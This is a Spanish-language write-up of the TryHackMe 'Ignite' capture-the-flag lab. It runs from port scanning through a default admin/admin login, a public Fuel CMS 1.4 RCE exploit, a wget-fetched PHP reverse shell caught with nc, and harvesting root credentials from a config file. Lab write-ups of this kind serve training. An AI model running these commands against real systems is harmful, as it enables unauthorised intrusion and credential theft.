@@ -1,0 +1,75 @@
+>>>TryHackMe
+>>Ignite
+
+>nmap
+
+>nmap -p- -sS -sC -sV  --min-rate 5000 -vvv -n -Pn 10.10.88.192 -oN nmap
+
+•80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
+ | http-robots.txt: 1 disallowed entry 
+
+Vemos que tenemos un servicio abierto en el puerto 80, encontramos un "Fuel CMS Version 1.4". Como observamos anteriormente tenemos robots.txt 
+
+En la ruta "http://10.10.88.192/fuel/login/pwd_reset" tenemos un login. Como no tenemos credenciales, optamos por buscar contraseñas por defecto asociadas a FuelCMS.
+
+>admin
+>admin
+
+Ingresamos por defecto, pero luego de revisar varias cosas no encontramos muchas opciones. Procederemos a buscar algún exploit relacionado con el servidor "Fuel CMS 1.4".
+
+>https://www.exploit-db.com/exploits/50477
+
+Ejecutamos el exploit con Python3.
+
+>python3 50477 -u http://10.10.88.192/
+
+Esto nos da ejecución remota de comandos como www-data.
+
+Una vez dentro, buscamos hacernos una reverse shell a nuestra máquina. Para esto, probamos si tenemos wget.
+
+>locate wget
+
+Nos da respuesta positiva, así que procedemos a hacer un servidor Python en nuestra máquina y llevarlo a la máquina víctima.
+
+**En mi máquina, dentro de donde tenemos la reverse shell guardada
+
+>python3 -m http.server 8080
+
+**Máquina víctima
+
+>wget {mi IP local}:8080/pentestmonkey.php
+
+Luego ingresamos vía navegador a la ruta de la reverse shell "http://{IP víctima}/pentestmonkey.php".
+
+**En mi máquina
+
+>nc -nlvp 443
+
+Y ya estamos dentro, ahora a hacer el tratamiento de la TTY (lo detesto).
+
+>script /dev/null -c bash
+>(Ctrl + Z)
+>stty raw -echo; fg
+>reset xterm
+>export TERM=xterm
+>export SHELL=bash
+
+Luego de buscar por un rato, encontramos una ruta interesante donde hay "database" para investigar.
+
+>cat var/www/html/fuel/application/config/database.php
+
+Dentro, vemos lo siguiente:
+
+•'username' => 'root',
+•'password' => '******',
+
+>su root
+pass:******
+
+Somos root.
+
+>cat flag.txt
+•********************************
+
+>cat root.txt
+•********************************
